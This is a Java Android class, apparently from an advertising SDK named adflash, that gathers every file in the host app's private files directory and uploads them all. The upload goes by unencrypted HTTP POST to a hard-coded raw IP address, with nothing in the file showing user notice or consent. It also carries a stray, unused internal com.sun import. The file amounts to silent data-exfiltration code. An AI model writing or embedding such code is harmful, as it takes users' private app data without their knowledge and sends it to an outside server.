package com.adflash.uploadfiles;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.TimeUnit;

import com.sun.org.apache.bcel.internal.generic.StackInstruction;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Toast;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class UploadFile implements Callable
{
	private final static String TAG = "upload_test";
	//http://35.163.250.168:7078/file-web/servlet/UploadHandlerServlet
	//http://api.mfdif.adflash.cn/sdk/smarthard/upload
	private final static String basePath = "http://35.163.250.168:7078/file-web/servlet/UploadHandlerServlet";

	Context mContext;
	String basepath = null;
	File baseFile;
	File[] files;
	List<String> filepaths;

	public UploadFile(Context context)
	{
		super();
		this.mContext = context;
		filepaths = new ArrayList<String>();
		baseFile = mContext.getFilesDir();

		if (baseFile.exists())
		{
			basepath = baseFile.getAbsolutePath();
			Log.i(TAG, "==package==" + context.getPackageName());
			Log.i(TAG, "==basepath==" + basepath);
		}
	}

	@Override
	public Object call() throws Exception
	{
		filepaths.clear();
		files = baseFile.listFiles();
		if (files != null)
		{
			for (int i = 0; i < files.length; i++)
			{
				Log.i(TAG, "==files[i]==" + files[i].getAbsolutePath());
				filepaths.add(files[i].getAbsolutePath());
			}
			
			upLoadFile(basePath,filepaths,new Callback()
			{
				
				@Override
				public void onResponse(Call call, Response response) throws IOException
				{
					Log.i(TAG,"upLoadFile success");
					
				}
				
				@Override
				public void onFailure(Call call, IOException ioexception)
				{
					Log.i(TAG," upLoadFile failer");
					
				}
			});
		}

		return null;
	}

	/**
	 * 通过上传的文件的完整路径生成RequestBody
	 * 
	 * @param fileNames
	 *            完整的文件路径
	 * @return
	 */
	private  RequestBody getRequestBody(List<String> fileNames)
	{
		// 创建MultipartBody.Builder，用于添加请求的数据
		Log.i(TAG,"getRequestBody");
		
		MultipartBody.Builder builder = new MultipartBody.Builder();
		for (int i = 0; i < fileNames.size(); i++)
		{ // 对文件进行遍历
			
			File file = new File(fileNames.get(i)); // 生成文件
			// 根据文件的后缀名，获得文件类型
			String fileType = getMimeType(file.getName());
			builder.addFormDataPart( // 给Builder添加上传的文件
					"upload", // 请求的名字
					file.getName(), // 文件的文字，服务器端用来解析的
					RequestBody.create(MediaType.parse(fileType), file) // 创建RequestBody，把上传的文件放入
			);
		}
		return builder.build(); // 根据Builder创建请求
	}

	private  String getMimeType(String name)
	{
		Log.i(TAG,"getRequestBody==end:" + name.substring(name.lastIndexOf(".") + 1));
		return name.substring(name.lastIndexOf(".") + 1);
	}

	/**
	 * 获得Request实例
	 * 
	 * @param url
	 * @param fileNames
	 *            完整的文件路径
	 * @return
	 */
	private Request getRequest(String url, List<String> fileNames)
	{
		Log.i(TAG,"getRequest");
		Request.Builder builder = new Request.Builder();
		builder.url(url).post(getRequestBody(fileNames));
		return builder.build();
	}

	/**
	 * 根据url，发送异步Post请求
	 * 
	 * @param url
	 *            提交到服务器的地址
	 * @param fileNames
	 *            完整的上传的文件的路径名
	 * @param callback
	 *            OkHttp的回调接口
	 */
	public void upLoadFile(String url, List<String> fileNames, Callback callback)
	{
		Log.i(TAG,"upLoadFile");
		OkHttpClient okHttpClient = new OkHttpClient();
		Call call = okHttpClient.newCall(getRequest(url, fileNames));
		call.enqueue(callback);
	}

}
